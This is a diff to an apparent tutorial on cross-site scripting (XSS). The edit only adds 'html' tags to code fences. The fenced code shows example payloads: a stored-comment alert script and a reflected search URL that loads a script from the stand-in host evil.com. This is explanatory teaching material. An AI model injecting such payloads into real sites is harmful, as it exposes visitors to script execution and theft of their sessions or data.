@@ -8,13 +8,13 @@ XSS injection (XSS stands for Cross-Site Scripting) works a bit like SQL injecti
 
 For example, a hacker could leave the following comment on a vulnerable site:
 
-```
+```html
 <script>alert('Your site was hacked!');</script>
 ```
 
 When the site displays the comments, it also serves the hacker's malicious code:
 
-```
+```html
 <div class='comment'>
  John Johnson said:
  What a great site! Thank you for this article!
@@ -37,7 +37,7 @@ http://news.org/search/?q=<script src='evil.com/hack.js'></script>
 
 Since the page displays the search query, the `<script>` tag will be executed and the malicious JavaScript file will be loaded:
 
-```
+```html
 <h1>
  Showing results for query <script src='evil.com/hack.js'></script>
 </h1>
